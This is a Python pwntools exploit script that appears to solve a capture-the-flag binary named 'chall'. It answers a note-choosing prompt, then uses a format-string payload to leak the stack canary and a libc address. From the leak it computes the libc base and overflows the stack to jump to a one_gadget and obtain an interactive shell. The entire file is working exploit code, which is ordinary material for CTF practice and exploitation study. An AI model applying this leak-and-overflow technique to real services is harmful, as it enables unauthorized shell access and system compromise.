#!/usr/bin/env python3
from pwn import *

BIN_FILE  = './chall'
LIBC_FILE = './libc.so.6'

HOST = args.HOST or 'localhost'
PORT = int(args.PORT or 1337)

context(os='linux', arch='amd64')
# context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

binf = ELF(BIN_FILE)
libc = ELF(LIBC_FILE) if LIBC_FILE != '' else None

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(BIN_FILE)
    else:
        return process(BIN_FILE)

notes = ['D', 'B', 'A', 'G', 'D']

def choose_notes(io, i):
    io.recvuntil('note:')
    io.recvline()
    io.recv(3)
    if notes[i] == io.recv(1).decode():
        io.sendlineafter('> ', '1')
    else:
        io.sendlineafter('> ', '2')    

def attack(io, **kwargs):
    for i in range(5):
        choose_notes(io, i)

    fsa = '%41$p_%43$p'
    io.sendlineafter('> ', fsa)
    io.recvuntil('0x')
    canary = int(io.recv(16), 16)
    io.recv(3)
    leak = int(io.recv(12), 16)
    
    libc.address = leak - 231 - libc.sym.__libc_start_main
    info('libc_base is 0x{:08x}'.format(libc.address))

    onegad = [0x4f3d5, 0x4f432, 0x10a41c]
    addr_onegad = libc.address + onegad[1]

    exploit = b'a' * 0x28
    exploit += p64(canary)
    exploit += b'a' * 0x38
    exploit += p64(addr_onegad)
    
    io.recvuntil('like')
    io.sendafter(': ', exploit)

def main():
    io = start()
    attack(io)
    io.interactive()

if __name__ == '__main__':
    main()
